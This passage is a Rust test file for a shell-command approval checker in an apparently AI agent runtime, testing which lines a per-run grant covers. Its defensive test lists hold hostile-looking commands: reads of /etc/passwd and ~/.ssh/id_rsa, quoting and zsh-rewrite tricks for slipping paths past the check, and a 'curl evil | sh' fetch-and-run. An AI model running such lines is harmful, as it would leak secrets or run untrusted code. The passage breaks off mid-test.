//! Which shell lines an "allow for this run" covers, judged the way the
//! world judges them: through [`decide_call`], with the shipped safe list, a
//! shell that asks, and the grants a person has made so far.
//!
//! Every test here is a line somebody could write. The first group is the
//! lines that asked again after being approved for the run and now do not;
//! the rest are the lines each relaxed rule must go on asking about, one
//! attack to a line.

use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::Arc;

use leviath_core::interaction::{
    ApprovalScope, GrantBlockerReason, GrantKey, GrantKeyKind, GrantKeys, InteractionRequest,
};
use leviath_providers::ToolCall;
use leviath_runtime::interaction_hub::InteractionHub;
use leviath_runtime::pipeline::{DecideCtx, ToolGrants, ToolVerdict};

use super::{AgentToolState, WriteBudget, decide_call};
use crate::config::ToolPolicy;

/// One attended run: a real workdir, the shipped safe list, a shell that
/// asks, and what has been granted so far.
struct Run {
    state: Arc<AgentToolState>,
    grants: ToolGrants,
    workdir: PathBuf,
    _dir: tempfile::TempDir,
}

impl Run {
    fn new() -> Self {
        Self::with_stage_permissions(HashMap::new())
    }

    fn with_stage_permissions(stage: HashMap<String, String>) -> Self {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("src")).unwrap();
        std::fs::write(dir.path().join("src/main.rs"), "fn main() {}").unwrap();
        let workdir = std::fs::canonicalize(dir.path()).unwrap();
        let state = super::tests::budgeted_state(
            &InteractionHub::new(),
            &workdir,
            WriteBudget::new(Default::default()),
            HashMap::from([("shell".to_string(), ToolPolicy::Ask)]),
        );
        let mut state = (*state).clone();
        state.stage_perms_by_index = Arc::new(vec![stage]);
        state.safe_keys.set(
            crate::approvals::resolve_safe_keys(&Default::default(), None, None, false)
                .into_keys()
                .collect(),
        );
        Self {
            state: Arc::new(state),
            grants: ToolGrants::default(),
            workdir,
            _dir: dir,
        }
    }

    fn decide(&self, line: &str) -> ToolVerdict {
        let call = ToolCall {
            id: "c".to_string(),
            name: "shell".to_string(),
            arguments: serde_json::json!({ "command": line }),
            thought_signature: None,
        };
        let ctx = DecideCtx {
            grants: &self.grants,
            written: 0,
            stage_index: 0,
        };
        decide_call(&self.state, &call, &ctx)
    }

    /// Whether `line` runs with nobody asked.
    fn runs(&self, line: &str) -> bool {
        matches!(self.decide(line), ToolVerdict::Run { .. })
    }

    /// What approving `line` would record, when it asks.
    fn asked(&self, line: &str) -> Option<GrantKeys> {
        match self.decide(line) {
            ToolVerdict::Ask { keys, .. } => Some(keys),
            _ => None,
        }
    }

    /// What approving `line` would record. Panics when it does not ask.
    fn asks(&self, line: &str) -> GrantKeys {
        self.asked(line).expect("the line asks")
    }

    /// Answer the prompt for `line` with "allow for this run".
    fn approve_for_run(&mut self, line: &str) -> GrantKeys {
        let keys = self.asks(line);
        self.grants.grant(Some(ApprovalScope::Run), &keys.run);
        keys
    }

    /// The lines in `lines` that run with nobody asked.
    fn unprompted<'a>(&self, lines: &[&'a str]) -> Vec<&'a str> {
        lines.iter().copied().filter(|l| self.runs(l)).collect()
    }

    /// The lines in `lines` that do not run with nobody asked.
    fn prompted<'a>(&self, lines: &[&'a str]) -> Vec<&'a str> {
        lines.iter().copied().filter(|l| !self.runs(l)).collect()
    }
}

/// The label of the run option for a prompt recording `keys`.
fn run_label(line: &str, keys: &GrantKeys) -> String {
    let request = InteractionRequest::tool_approval(
        "id",
        "shell",
        serde_json::json!({ "command": line }),
        "s",
        keys,
    );
    request.options[2].clone()
}

/// The outside paths `keys` would record for the run, as program and path.
fn outside_paths(keys: &GrantKeys) -> Vec<(String, String)> {
    keys.run
        .iter()
        .map(|k| GrantKey::describe(k))
        .filter(|k| k.kind == GrantKeyKind::OutsidePath)
        .map(|k| (k.program.unwrap_or_default(), k.path.unwrap_or_default()))
        .collect()
}

const GODOT: &str = "/Applications/Godot.app/Contents/MacOS/Godot";

// ─── The issue's lines ───────────────────────────────────────────────────────

/// Point 1. A short flag with a glued `res://` value read as `/tests`, so the
/// line was approved once and asked again. It now records its program, and
/// the same line runs.
#[test]
fn a_short_flag_with_a_glued_url_is_covered_by_its_programs_grant() {
    let mut run = Run::new();
    let line = format!("{GODOT} --headless -s addons/gut/gut_cmdln.gd -gdir=res://tests -gexit");
    let keys = run.approve_for_run(&line);
    assert_eq!(keys.run, [format!("shell:{GODOT}")]);
    assert!(run.runs(&line), "the second occurrence must not ask");
}

/// Point 2. A program named by an absolute path after `--` is a positional
/// path outside the workdir. Approving the line records the program and that
/// exact path; the same line then runs, and another outside path still asks.
#[test]
fn an_outside_path_after_the_program_is_covered_once_approved() {
    let mut run = Run::new();
    let line = format!("polywright surface-test --png out.png -- {GODOT} --path .");
    let keys = run.approve_for_run(&line);
    assert_eq!(keys.run[0], "shell:polywright surface-test");
    let paths = outside_paths(&keys);
    assert_eq!(paths.len(), 1, "{keys:?}");
    assert_eq!(paths[0].0, "polywright");
    assert!(paths[0].1.ends_with("Godot"), "{paths:?}");
    assert!(run.runs(&line), "the second occurrence must not ask");
    // Any other outside path asks, and names itself.
    let other = line.replace("MacOS/Godot", "MacOS/Other");
    let asked = run.asks(&other);
    assert_eq!(asked.run.len(), 1, "only the new path is left to approve");
    assert!(outside_paths(&asked)[0].1.ends_with("Other"));
}

/// Point 2, the issue's other line: `test` is on the safe list, so the path
/// is all there is to approve.
#[test]
fn a_safe_program_with_an_outside_path_asks_for_the_path_alone() {
    let mut run = Run::new();
    let keys = run.approve_for_run("test -x /abs/tool");
    assert_eq!(keys.run.len(), 1, "{keys:?}");
    let (program, path) = outside_paths(&keys).remove(0);
    assert_eq!(program, "test");
    assert!(path.ends_with("tool"), "{path}");
    assert!(run.runs("test -x /abs/tool"));
}

/// Point 3a. `echo` opens no file, so a plain expansion in its argument is
/// printed and nothing else: the line runs on the safe list alone.
#[test]
fn echo_of_a_plain_expansion_runs_on_the_safe_list() {
    let run = Run::new();
    assert!(run.runs("echo \"exit=${pipestatus[1]}\""));
    assert_eq!(run.asked("echo \"exit=${pipestatus[1]}\""), None);
}

/// Point 3b. A loop over literal words is checked as if its variable were
/// each word in turn, and every program in it is on the safe list.
#[test]
fn a_loop_over_literal_words_runs_on_the_safe_list() {
    let run = Run::new();
    assert!(run.runs("for d in a b; do test -e \"$d\" && echo \"$d\"; done"));
}

/// Point 4. A program named through a variable is not covered: it asks, it
/// records nothing, and it asks again.
#[test]
fn a_program_named_through_a_variable_still_records_nothing() {
    let mut run = Run::new();
    for line in [
        "G=/abs/godot; $G --version",
        "PW=\"/abs/polywright\"; \"$PW\" surface-test",
    ] {
        let keys = run.approve_for_run(line);
        assert!(keys.run.is_empty() && keys.stage.is_empty(), "{line}");
        assert!(!run.runs(line), "{line} must ask again");
    }
}

// ─── What the label says ─────────────────────────────────────────────────────

/// A line that records nothing says which word stopped it and why, in the
/// label and in the list a client reads.
#[test]
fn a_line_that_records_nothing_names_the_word_and_the_reason() {
    let run = Run::new();
    let reason_of = |line: &str| {
        let keys = run.asks(line);
        assert!(keys.run.is_empty(), "{line}");
        let label = run_label(line, &keys);
        let blocker = keys.blocked[0].clone();
        assert!(label.contains(&blocker.detail), "{label}");
        (blocker.word, blocker.reason)
    };
    use GrantBlockerReason::*;
    for (line, word, reason) in [
        ("G=/abs/godot; $G --version", "$G", ProgramFromVariable),
        ("cat \"$HOME/x\"", "$HOME/x", ExpandedAtRunTime),
        ("cat --file=/etc/hosts", "--file=/etc/hosts", OutsideWorkdir),
        ("grep -f/etc/list x", "-f/etc/list", OutsideWorkdir),
        ("cat < /etc/hosts", "/etc/hosts", OutsideWorkdir),
        ("cat /etc/host*", "/etc/host*", UnplaceablePath),
        ("cat ~other/x", "~other/x", UnplaceablePath),
        ("cd / && ls", "/", OutsideWorkdir),
        ("cd && ls", "cd", UnplaceablePath),
        ("grep -R key .", "-R", UnplaceablePath),
        ("eval ls", "eval", RunsAssembledCommand),
        ("trap ls EXIT", "trap", InstallsCode),
        ("git diff --output=x", "--output=x", EscapeFlag),
        ("export $NAME=1", "$NAME=1", ExpandedAtRunTime),
        ("export 1x=2", "1x=2", UnreadableLine),
        ("ls `pwd`", "", UnreadableLine),
        ("set -e", "", NothingRuns),
        (
            "cat file://server/share",
            "file://server/share",
            UnplaceablePath,
        ),
        ("cat =ls", "=ls", UnplaceablePath),
        ("diff -r a b", "-r", UnplaceablePath),
        ("file -C -m magic", "-C", EscapeFlag),
        ("setopt extendedglob; ls", "setopt", UnreadableLine),
    ] {
        assert_eq!(
            reason_of(line),
            (word.to_string(), reason),
            "the reason for {line:?}"
        );
    }
    assert_eq!(
        run_label(
            "G=/abs/godot; $G --version",
            &run.asks("G=/abs/godot; $G --version")
        ),
        "Allow for this run (nothing reusable: `$G` names the program at run time - it will \
         ask again)"
    );
    // Every word that stops the line is named, not only the first.
    let keys = run.asks("cat \"$A\" --file=/etc/hosts");
    let words: Vec<&str> = keys.blocked.iter().map(|b| b.word.as_str()).collect();
    assert_eq!(words, ["$A", "--file=/etc/hosts"]);
}

/// The label names every key the grant covers, the outside path among them.
#[test]
fn the_label_names_every_key_and_the_outside_path() {
    let run = Run::new();
    let line = "cp a b && curl -s x && mkdir d && rm f && tar xf t && test -x /abs/tool";
    let keys = run.asks(line);
    let label = run_label(line, &keys);
    for named in ["cp a", "curl", "mkdir d", "rm f", "tar xf"] {
        assert!(label.contains(named), "{named} is missing from {label}");
    }
    assert!(!label.contains("more"), "{label}");
    let (_, path) = outside_paths(&keys).remove(0);
    assert!(
        label.contains(&format!("test with {path} (outside the working directory)")),
        "{label}"
    );
}

// ─── Point 1: what a flag's value and a URL must still ask about ─────────────

/// The value of `-x=value` is still a path, a `file:` URL is its path, and a
/// made-up scheme does not carry a real path past the check.
#[test]
fn a_flag_value_or_a_url_that_names_a_path_outside_still_asks() {
    let run = Run::new();
    let hostile = [
        // The value after the `=` is checked as a path.
        "cat -o=/etc/passwd",
        "cat -o=../../etc/passwd",
        "cat -o=~/.ssh/id_rsa",
        // A `file:` URL is a path, in any spelling and any position.
        "cat file:///etc/passwd",
        "cat file:/etc/passwd",
        "cat file://localhost/etc/passwd",
        "cat FILE:///etc/passwd",
        "cat --url=file:///etc/passwd",
        "cat -u=file:///etc/passwd",
        "cat -ufile:///etc/passwd",
        "cat jar:file:///etc/x.jar",
        // One this cannot place: another host, a percent-encoded climb.
        "cat file://server/share/x",
        "cat file:///%2e%2e/%2e%2e/etc/passwd",
        // A made-up scheme in front of a real path, for a program that
        // strips it.
        "cat x:///etc/passwd",
        "cat x://../../etc/passwd",
        "cat x://~/.ssh/id_rsa",
        "cat --in=x:///etc/passwd",
        "cat -i=x:///etc/passwd",
        "cat -ix:///etc/passwd",
        "cat a://b://../../../etc/passwd",
        // The tail reading is kept: a path glued to a flag, with or without
        // a URL after it.
        "cat -f../list",
        "cat -rf/etc/x",
        "cat -rf/etc/x://y",
        "cat -f/etc/x=y",
    ];
    assert_eq!(run.unprompted(&hostile), Vec::<&str>::new());
    // The control: the same shapes naming nothing outside run on the safe
    // list, so the list above is not passing because everything asks.
    let harmless = [
        "cat -gdir=res://tests",
        "cat -o=src/main.rs",
        "cat res://tests https://example.com/a?b=1",
        "cat --url=https://example.com/x",
        "cat -uhttps://example.com/x/y",
        "cat file:src/main.rs",
    ];
    assert_eq!(run.prompted(&harmless), Vec::<&str>::new());
}

/// A flag that takes its value glued on opens a file called `name=value`.
/// That reading is kept, so a symlink by that name pointing out is seen.
#[cfg(unix)]
#[test]
fn a_file_named_like_a_flag_and_its_value_is_still_checked() {
    let run = Run::new();
    let outside = tempfile::tempdir().unwrap();
    std::fs::write(outside.path().join("secret"), "TOP").unwrap();
    std::os::unix::fs::symlink(outside.path().join("secret"), run.workdir.join("f=a")).unwrap();
    assert!(!run.runs("grep -ff=a src/main.rs"));
    assert!(run.runs("grep -ff=b src/main.rs"));
}

// ─── Point 2: what a path grant must not cover ───────────────────────────────

/// A grant names one program with one path. It covers neither another path
/// (under it, above it, beside it, in another case) nor another program with
/// the same path, and the safe list never covers a path at all.
#[test]
fn a_path_grant_covers_that_program_with_that_path_and_nothing_else() {
    let mut run = Run::new();
    run.approve_for_run("test -x /abs/tool");
    let hostile = [
        "test -x /abs/tool2",
        "test -x /abs/tool/inner",
        "test -x /abs",
        "test -x /",
        "test -x /ABS/TOOL",
        "test -x /abs/tool /abs/other",
        // The same path handed to another program, safe-listed or not.
        "cat /abs/tool",
        "head -c 100 /abs/tool",
        "wc -c /abs/tool",
        // Where no key names it: an option, a redirect, a glob, a `cd`.
        "test --file=/abs/tool",
        "test -f/abs/tool x",
        "cat < /abs/tool",
        "test -x /abs/too*",
        "test -x /abs/{tool,other}",
        "cd /abs/tool && ls",
        // A `..` through a directory that is not there cannot be resolved.
        "test -x /abs/missing/../tool",
    ];
    assert_eq!(run.unprompted(&hostile), Vec::<&str>::new());
    // The same path, spelled with a trailing separator or a `.`, is the same
    // file and is covered.
    assert!(run.runs("test -x /abs/tool/"));
    assert!(run.runs("test -e /abs/./tool"));
    // The safe list is never asked about a path key.
    let key = leviath_core::interaction::outside_path_key("cat", "/abs/tool");
    let mut safe: std::collections::HashSet<String> = (*run.state.safe_keys.get()).clone();
    safe.insert(key);
    run.state.safe_keys.set(safe);
    assert!(!run.runs("cat /abs/tool"));
}

/// A path is granted as the file it is, not as it is spelled: a second
/// spelling of the same file is covered, and a symlink pointed somewhere new
/// is not.
#[cfg(unix)]
#[test]
fn a_path_grant_follows_the_file_and_not_the_spelling() {
    let mut run = Run::new();
    let outside = tempfile::tempdir().unwrap();
    let out = std::fs::canonicalize(outside.path()).unwrap();
    std::fs::create_dir_all(out.join("sub")).unwrap();
    std::fs::write(out.join("tool"), "").unwrap();
    std::fs::write(out.join("secret"), "TOP").unwrap();
    let link = out.join("link");
    std::os::unix::fs::symlink(out.join("tool"), &link).unwrap();

    let through_link = format!("test -x {}", link.display());
    let keys = run.approve_for_run(&through_link);
    // What is granted, and shown, is where the link points.
    assert_eq!(
        outside_paths(&keys),
        [("test".to_string(), out.join("tool").display().to_string())]
    );
    assert!(run.runs(&through_link));
    // Other spellings of the same file.
    assert!(run.runs(&format!("test -x {}", out.join("tool").display())));
    assert!(run.runs(&format!("test -x {}/sub/../tool", out.display())));
    assert!(run.runs(&format!("test -x {}//tool/", out.display())));
    // Another case of the name is the same file where the file system says
    // it is, and a different one, which is not there, where it does not.
    let other_case = out.join("TOOL");
    assert_eq!(
        run.runs(&format!("test -x {}", other_case.display())),
        other_case.exists()
    );
    // The link is pointed at something else: the same line is a new read.
    std::fs::remove_file(&link).unwrap();
    std::os::unix::fs::symlink(out.join("secret"), &link).unwrap();
    assert!(!run.runs(&through_link));
    // A symlink inside the workdir that points out is granted as its target.
    std::os::unix::fs::symlink(out.join("secret"), run.workdir.join("leak")).unwrap();
    let keys = run.approve_for_run("cat leak");
    assert_eq!(
        outside_paths(&keys),
        [("cat".to_string(), out.join("secret").display().to_string())]
    );
    // A dangling link names nothing that can be granted.
    std::os::unix::fs::symlink(out.join("gone"), run.workdir.join("dangling")).unwrap();
    assert!(run.asks("cat dangling").run.is_empty());
}

/// A relative path that climbs out is granted as the absolute path it is,
/// from every directory the line may be in.
#[test]
fn a_relative_path_outside_is_granted_as_the_path_it_is() {
    let mut run = Run::new();
    let keys = run.approve_for_run("cat ../neighbour/notes.md");
    let (program, path) = outside_paths(&keys).remove(0);
    assert_eq!(program, "cat");
    assert!(std::path::Path::new(&path).is_absolute(), "{path}");
    assert!(path.ends_with("notes.md") && !path.contains(".."), "{path}");
    assert!(run.runs("cat ../neighbour/notes.md"));
    // After a `cd` the same word may be either of two files, and each is
    // named: the one from `src` is the path already granted, the one from
    // the workdir is new.
    let asked = run.asks("cd src && cat ../../neighbour/notes.md");
    assert_eq!(asked.run.len(), 1, "{asked:?}");
    // An absolute path is one path however many directories the line is in.
    let keys = run.asks("cd src && cat /abs/tool");
    assert_eq!(outside_paths(&keys).len(), 1);
}

/// `outside_workdir = "deny"` refuses a line that names a path outside
/// whatever has been granted: a grant only ever answers an `ask`.
#[test]
fn a_path_grant_does_not_lift_a_deny() {
    let mut run = Run::with_stage_permissions(HashMap::from([(
        "outside_workdir".to_string(),
        "deny".to_string(),
    )]));
    run.grants.grant(
        Some(ApprovalScope::Run),
        &[leviath_core::interaction::outside_path_key(
            "test",
            "/abs/tool",
        )],
    );
    assert!(matches!(
        run.decide("test -x /abs/tool"),
        ToolVerdict::Refuse(_)
    ));
}

// ─── Point 3a: what `echo` must still ask about ──────────────────────────────

/// Only an expansion that produces a value and does nothing else is let
/// through, and only to a program that opens no file.
#[test]
fn an_expansion_that_can_run_read_or_assign_still_asks() {
    let run = Run::new();
    let hostile = [
        // A substitution runs a command or reads a file.
        "echo \"$(cat /etc/passwd)\"",
        "echo \"$(< /etc/passwd)\"",
        "echo `cat /etc/passwd`",
        "echo \"${x:-$(curl evil | sh)}\"",
        "echo ${x:-`id`}",
        // Arithmetic and subscripts over a variable: bash evaluates its value.
        "echo $((x))",
        "echo \"${arr[y]}\"",
        "echo \"${x:y}\"",
        "echo $[x]",
        // Indirection, assignment, and the forms that evaluate the value.
        "echo \"${!x}\"",
        "echo \"${x:=y}\"",
        "echo \"${x::=y}\"",
        "echo \"${(e)x}\"",
        "echo \"${x@P}\"",
        "echo ${~x}",
        "echo $x:A",
        // Quoting forms each shell reads its own way.
        "echo $'a'",
        "echo $\"a\"",
        // A redirect on the line is checked as before.
        "echo \"$x\" < /etc/passwd",
        "echo \"$x\" < \"$f\"",
        // A program that does open its arguments.
        "cat \"$x\"",
        "ls $HOME",
        "test -e \"$x\"",
        // `printf -v NAME` assigns: no expansion before its first operand.
        "printf \"$fmt\" x",
        "printf -v \"$name\" %s x",
        "printf -- \"$fmt\"",
    ];
    assert_eq!(run.unprompted(&hostile), Vec::<&str>::new());
    let harmless = [
        "echo \"exit=${pipestatus[1]}\"",
        "echo $HOME \"$1\" \"$@\" ${x:-default} \"${#x}\" ${path##*/} $((1+2))",
        "printf '%s\\n' \"$x\" \"${y:-none}\"",
        "sleep \"$delay\"",
    ];
    assert_eq!(run.prompted(&harmless), Vec::<&str>::new());
}

// ─── Point 3b: what a loop must still ask about ──────────────────────────────

/// A loop's values are checked like any other operand, and a variable is
/// read only where the line itself fixes it.
#[test]
fn a_loop_that_reaches_outside_or_is_not_spelled_out_still_asks() {
    let run = Run::new();
    let hostile = [
        // The listed values are checked: one of them is outside.
        "for f in src/main.rs /etc/passwd; do cat \"$f\"; done",
        "for f in a ../../etc/passwd; do cat \"$f\"; done",
        "for d in src /; do cd \"$d\" && ls; done",
        "for f in a /etc/passwd; do cat < \"$f\"; done",
        // Not spelled out.
        "for f in *; do cat \"$f\"; done",
        "for f in $(ls /etc); do cat \"$f\"; done",
        "for f in a $x; do cat \"$f\"; done",
        // Reassigned in the body, or by a nested loop.
        "for f in a b; do f=/etc/passwd; cat \"$f\"; done",
        "for f in a b; do read f; cat \"$f\"; done",
        "for f in a b; do for f in /etc/passwd; do true; done; cat \"$f\"; done",
        // Used after the loop, which may never have run.
        "for f in a b; do true; done; cat \"$f\"",
        "false && for f in a b; do true; done; cat \"$f\"",
        // A variable the shell rewrites.
        "for _ in a; do true /etc/passwd; cat \"$_\"; done",
        "for PWD in a/b/c; do cd .; cat \"$PWD/../../x\"; done",
        // A `done` only this reader sees.
        "if false; then for f in a b; do true; done; fi; cat \"$f\"; [[ -n x || done ]]",
        "true # ; for f in a b; do\ncat \"$f\"\ntrue # ; done",
        // Split on a changed `IFS`.
        "IFS=:; for f in a:/etc/passwd; do cat $f; done",
    ];
    assert_eq!(run.unprompted(&hostile), Vec::<&str>::new());
    let harmless = [
        "for d in a b; do test -e \"$d\" && echo \"$d\"; done",
        "for f in src/main.rs README.md; do wc -l \"$f\"; done",
        "for d in src docs; do test -d $d && ls \"$d\"; done",
        "for f in src/main.rs; do cat < \"$f\"; done",
    ];
    assert_eq!(run.prompted(&harmless), Vec::<&str>::new());
    // A value outside is something a person can approve by name.
    let keys = run.asks("for f in src/main.rs /abs/tool; do cat \"$f\"; done");
    assert_eq!(outside_paths(&keys).len(), 1);
}

// ─── A word a program or the shell takes apart ───────────────────────────────

/// A word is never inside on the strength of how it reads whole: each part
/// between its `:`, `,` and `=` is a path a program may open. `file -m`
/// takes a colon list and prints the lines of each file back as warnings.
#[test]
fn a_word_a_program_takes_apart_is_checked_part_by_part() {
    let mut run = Run::new();
    let hostile = [
        "file -m=x:/etc/hosts README.md",
        "file -m=x:../../etc/passwd x",
        "file -m x:/etc/hosts README.md",
        "file -m x://etc/hosts README.md",
        "file --magic-file=x:/etc/hosts README.md",
        "file -mx:/etc/hosts README.md",
        "cat if=/etc/hosts",
        "cat a,/etc/hosts",
        "cat a:b:/etc/hosts",
        "cat x:../../etc/passwd",
        // `bash` expands the `~` of a word shaped like an assignment.
        "cat x=~/.ssh/id_rsa",
        "cat x=a:~/.ssh/id_rsa",
        "cat x:~root/.profile",
    ];
    assert_eq!(run.unprompted(&hostile), Vec::<&str>::new());
    let harmless = [
        "file src/main.rs",
        "file -m magic src/main.rs",
        "cat 12:30 key:value host:8080 a=b,c",
        "cat -gdir=res://tests res://tests https://example.com/a?b=1,2",
        "grep -rn \"url = https://example.com/x\" src",
        "grep -rn \"path=/zz-no-such-root-1118/v1\" src",
        "git log --format=%h:%s -- src",
    ];
    assert_eq!(run.prompted(&harmless), Vec::<&str>::new());
    // The part is a path like any other: approved for the run it is covered,
    // for that program, and another part asks.
    let keys = run.approve_for_run("file -m x:/etc/hosts README.md");
    let (program, path) = outside_paths(&keys).remove(0);
    assert_eq!(program, "file");
    assert!(path.ends_with("hosts"), "{path}");
    assert!(run.runs("file -m x:/etc/hosts README.md"));
    assert!(!run.runs("file -m x:/etc/passwd README.md"));
    assert!(
        !run.runs("file -m=x:/etc/hosts README.md"),
        "not in an option"
    );
}

/// zsh rewrites some words before the program sees them, and a word it
/// rewrites is not placed as it is written: `=ls` is `/bin/ls`, `f<1-5>` is
/// every `f1` to `f5`, and under an option the line turns on `^x` is every
/// name but `x`.
#[test]
fn a_word_zsh_rewrites_is_not_placed_as_written() {
    let mut run = Run::new();
    let hostile = [
        "cat =ls",
        "head -c 64 =ls",
        "cat =l\"s\"",
        "cat \"\"=ls",
        "cat ''=ls",
        "cat < =ls",
        "for c in ls; do cat =$c; done",
        "for c in ls; do cat =\"$c\"; done",
        "cat f<1-5>",
        "cat f<->",
        "set -o extendedglob; cat ^README.md",
        "set -y; cat src/main.rs",
        "set -o globdots; cat *",
        // zsh's `***` walks through every symlink, and its two-name `cd`
        // rewrites the current directory.
        "cat ***/secret",
        "cd src docs && cat main.rs",
        // A parenthesis after a word is a glob in zsh: these open `xid`,
        // `xps`, `idid` or `psid`, which may be links to anywhere.
        "cat x(id|ps)",
        "cat (id|ps)id",
    ];
    assert_eq!(run.unprompted(&hostile), Vec::<&str>::new());
    let harmless = [
        "cat \"=ls\"",
        "grep \"=> \" src/main.rs",
        "test a = b",
        "set -euo pipefail; cat src/main.rs",
        "cat < src/main.rs > /dev/null",
        "(cd src && cat main.rs)",
    ];
    assert_eq!(run.prompted(&harmless), Vec::<&str>::new());
    // A line that changes the shell's options records nothing.
    for line in [
        "setopt extendedglob; cat ^README.md",
        "shopt -s dotglob; cat *",
    ] {
        let keys = run.approve_for_run(line);
        assert!(keys.run.is_empty(), "{line}");
        assert!(!run.runs(line), "{line}");
    }
}

/// A loop variable's value is checked as part of the word it sits in, and
/// the word it completes is read like any other: an option, a home
/// directory, a glob, a brace list, a URL.
#[test]
fn a_loop_value_cannot_complete_a_word_into_something_else() {
    let run = Run::new();
    let hostile = [
        "for d in R; do grep -$d key .; done",
        "for d in f/etc/hosts; do grep -$d key .; done",
        "for d in /etc/hosts; do grep --file=$d key .; done",
        "for d in root; do cat ~$d/.profile; done",
        "for d in src; do cat \"$d\"/../../etc/hosts; done",
        "for d in /etc; do cat $d/host*; done",
        "for d in src; do cat {$d,/etc/hosts}; done",
        "for x in le:/etc/hosts; do cat fi$x; done",
        "for x in file; do cat $x:///etc/hosts; done",
        "for x in x; do cat $x:/etc/hosts; done",
        "for x in /etc/hosts; do file -m a:$x README.md; done",
        "for d in list; do strings @$d; done",
        "for d in etc; do cat /$d/hosts; done",
    ];
    assert_eq!(run.unprompted(&hostile), Vec::<&str>::new());
    let harmless = [
        "for d in src; do cat \"$d\"/main.rs; done",
        "for d in src; do cat $d/*.rs; done",
        "for x in res; do cat $x://tests; done",
        "for x in main; do cat src/$x.rs; done",
    ];
    assert_eq!(run.prompted(&harmless), Vec::<&str>::new());
}

// ─── A line continuation ─────────────────────────────────────────────────────

/// The shell removes a backslash-newline before it reads a word, so the two
/// halves of a `..`, an option, an `=name` or a `$(` join across it. A line
/// where it could join anything asks; one where it only breaks the line
/// between words is read as if it were not there.
#[test]
fn a_line_continuation_cannot_join_what_the_check_reads_apart() {
    let run = Run::new();
    let hostile = [
        "cat src/.\\\n./.\\\n./.\\\n./.\\\n./etc/hosts",
        "cd src && cat .\\\n./.\\\n./etc/hosts",
        "cat li\\\nnk",
        "cat \\\n=ls",
        "grep -\\\nR key .",
        "git diff --out\\\nput=x",
        "cat <\\\n<EOF\necho 'x\nEOF\ncat /etc/hosts\necho '\n'",
        "cat <<EOF\n$\\\n(cat /etc/hosts)\nEOF",
        "echo \"$\\\n(cat /etc/hosts)\"",
    ];
    assert_eq!(run.unprompted(&hostile), Vec::<&str>::new());
    let harmless = [
        "cat \\\n  src/main.rs",
        "cat src/main.rs |\\\n  wc -l",
        "cat src/main.rs && \\\n  cat src/main.rs",
        "echo \"one \\\ntwo\"",
        "cat <<'EOF'\n$\\\n(cat /etc/hosts)\nEOF",
    ];
    assert_eq!(run.prompted(&harmless), Vec::<&str>::new());
}

// ─── Options that open a file ────────────────────────────────────────────────

/// Every program on the default safe list, with each option of it that opens
/// a file: the file is checked as a path, or the line is not covered.
#[test]
fn an_option_that_opens_a_file_is_checked_or_the_line_asks() {
    let run = Run::new();
    let hostile = [
        // The file is named and checked.
        "cat /etc/hosts",
        "head -c 10 /etc/hosts",
        "tail -n 1 /etc/hosts",
        "wc -l /etc/hosts",
        "cut -c1 /etc/hosts",
        "ls /etc",
        "stat /etc/hosts",
        "du /etc",
        "df /etc",
        "od -c /etc/hosts",
        "strings /etc/hosts",
        "column /etc/hosts",
        "cmp /etc/hosts x",
        "diff /etc/hosts x",
        "diff --from-file=/etc/hosts x",
        "file /etc/hosts",
        "file -m /etc/hosts x",
        "realpath /etc/hosts",
        "readlink /etc/hosts",
        "test -r /etc/hosts",
        "grep -f /etc/hosts x",
        "grep --file=/etc/hosts x",
        "grep --exclude-from=/etc/hosts -r key .",
        "grep key /etc/hosts",
        "date -f /etc/hosts",
        "date --file=/etc/hosts",
        "date -r /etc/hosts",
        "jq . /etc/x.json",
        "jq -f /etc/x.jq .",
        "jq --slurpfile a /etc/x.json .",
        "jq --rawfile a /etc/hosts .",
        "jq -L /etc .",
        "git diff --no-index /etc/hosts x",
        "git log -- /etc",
        "git blame --contents /etc/hosts x",
        "git show --output=x",
        // A program whose words were skipped, and an option of it that
        // opens a file.
        "pgrep -F /etc/hosts",
        "hostname -F /etc/hosts",
        // The files it reads are not on the line at all.
        "file -f list",
        "file --files-from=list",
        "wc --files0-from=list",
        "du --files0-from=list",
        "strings @list",
        "diff -r a b",
        "grep -R key .",
        "grep -rS key .",
        "jq -n 'import \"x\" as $d {\"search\":\"/etc\"}; $d'",
        // It writes, or runs an editor.
        "file -C -m magic",
        "git branch --edit-description",
        // The same options as `getopt_long` and git also take them: by a
        // prefix of the name, or in a cluster of letters.
        "file --comp -m magic",
        "file -bC -m magic",
        "git branch --edit-desc",
        "git branch --e",
        "file --files list",
        "wc --files0=list",
        // `diff` handed a directory reads every file in it.
        "diff src src",
        "diff -q src/main.rs src",
        "jq -n '\"m\" | modulemeta'",
        "diff --rec a b",
        "grep --dereference-r key .",
    ];
    assert_eq!(run.unprompted(&hostile), Vec::<&str>::new());
    let harmless = [
        "git diff --exit-code",
        "pgrep -f node",
        "ps aux",
        "hostname",
        "file -b src/main.rs",
        "wc -l src/main.rs",
        "diff -u src/main.rs src/main.rs",
        "grep -rn key .",
        "jq '.a,.b' data.json",
        "date +%s",
    ];
    assert_eq!(run.prompted(&harmless), Vec::<&str>::new());
}

// ─── A line the reader cannot follow ─────────────────────────────────────────

/// A comment runs to the end of its line and no further, whatever it holds:
/// a quote in one opens nothing, and a backslash that ends one continues
/// nothing.
#[test]
fn a_comment_ends_with_its_line() {
    let run = Run::new();
    let hostile = [
        "ls # '\ntouch marker\n# '",
        "ls # \"\ntouch marker\n# \"",
        "ls #'\ntouch marker\n#'",
        "ls # x \\\ntouch marker",
        "ls\n# `\ntouch marker",
        // Only a blank, a newline or an operator comes before a comment.
        "ls\r# ; touch marker",
        "ls\u{b}# ; touch marker",
    ];
    assert_eq!(run.unprompted(&hostile), Vec::<&str>::new());
    let harmless = [
        "ls # list the files",
        "# a note\nls",
        "ls src # it's here",
        "ls # a `tick` and a $(sub) and a > b",
        "echo a#b \"\"#c",
    ];
    assert_eq!(run.prompted(&harmless), Vec::<&str>::new());
}

/// Quoting that the shells do not read alike, and a substitution whose end
/// depends on its quotes, are read as the shell reads them or not at all.
#[test]
fn a_line_whose_quoting_the_reader_cannot_follow_asks() {
    let mut run = Run::new();
    // `$'..\'..'`: bash and zsh carry on past the escaped quote, a POSIX
    // `sh` stops at it. A grant for one such line covers nothing.
    let keys = run.approve_for_run("x=$'\\'' ; touch marker #'");
    assert!(keys.run.is_empty(), "{keys:?}");
    assert!(!run.runs("x=$'\\'' ; touch other #'"));
    // A parenthesis between quotes does not close a substitution, so what
    // follows it is still a command of the line.
    let keys = run.approve_for_run("x=\"$(echo '(')\"; touch marker; echo \")\"");
    assert!(
